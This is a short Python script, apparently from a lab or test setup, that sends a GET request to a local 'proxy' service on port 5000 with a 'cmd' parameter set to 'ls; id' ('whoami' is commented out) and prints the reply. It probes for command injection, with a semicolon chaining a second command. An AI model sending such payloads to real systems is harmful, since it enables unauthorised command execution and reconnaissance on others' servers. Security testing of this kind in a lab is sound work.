import requests

url = "http://proxy:5000/"

#payload = {'cmd': 'whoami'}
payload = {'cmd': 'ls; id'}

response = requests.get(url, params=payload)

print("Response from server:", response.text)
